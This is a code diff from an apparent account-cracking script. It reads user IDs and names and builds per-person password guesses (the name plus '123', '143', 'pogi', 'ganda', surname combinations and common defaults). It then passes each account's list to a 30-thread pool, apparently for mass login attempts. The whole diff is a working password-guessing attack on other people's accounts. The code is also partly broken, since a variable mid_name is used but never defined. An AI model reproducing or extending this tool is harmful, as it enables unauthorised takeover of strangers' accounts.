@@ -816,15 +816,63 @@ def gxdsfiles(gxdsfiles1):
     # PASSWORD LIST
     with ThreadPool(max_workers=30) as GOXDIES:
         for data in gxdsfiles1:
-            fs = name.split(" ")[0]
-            try:
-                ls = name.split(" ")[1]
-            except:
-                ls = fs
             uid = data.split("|")[0]
-            pwx = [fs + "123", +fs + "143"]
+            pwx = []
+            pwx.append("password")
+            pwx.append("password123")
+            pwx.append("Password")
+            pwx.append("Password123")
+            nam = data.split("|")[1]
+            name = nam.lower()
+            try:
+                name1 = name.split(" ")[0]
+                nam1 = nam.split(" ")[0]
+                if len(name1) < 3:
+                    pass
+                else:
+                    pwx.append(nam1 + "123")
+                    pwx.append(name1 + "143")
+                    pwx.append(name1 + "12")
+                    pwx.append(name1 + "pogi")
+                    pwx.append(name1 + "ganda")
+                    pwx.append(name1 + "123")
+                    pwx.append(name1 + " 123")
+                    pwx.append(name1 + "1234")
+                    pwx.append(name1 + "12345")
+            except:
+                pass
+            try:
+                sur_name = name.split(" ")[2]
+                nam3 = nam.split(" ")[2]
+                if len(sur_name) < 3:
+                    pass
+                else:
+                    pwx.append(nam3)
+                    pwx.append(sur_name + "123")
+                    pwx.append(sur_name + "1234")
+                    pwx.append(sur_name + "12345")
+                    pwx.append(name1 + sur_name)
+                    pwx.append(name1 + sur_name + "143")
+                    pwx.append(name1 + sur_name + "123")
+                    pwx.append(name1 + " " + sur_name + "143")
+                    pwx.append(name1 + " " + sur_name + "123")
+                    pwx.append(name1 + mid_name + sur_name)
+                    pwx.append(name1 + mid_name + sur_name + "123")
+                    pwx.append(name1 + mid_name + sur_name + "1234")
+                    pwx.append(name1 + mid_name + sur_name + "12345")
+                    pwx.append(name1 + mid_name + sur_name + "@#")
+                    pwx.append(name1 + mid_name + sur_name + "@@")
+                    pwx.append(name1 + mid_name + sur_name + "@")
+                    pwx.append(name1 + " " + mid_name + " " + sur_name)
+                    pwx.append(name1 + " " + mid_name + " " + sur_name + "123")
+            except:
+                pass
 
-            GOXDIES.submit(gxds_files, uid, pwx,)
+            GOXDIES.submit(
+                gxds_files,
+                uid,
+                pwx,
+            )
 
 
 # LOOP MENU
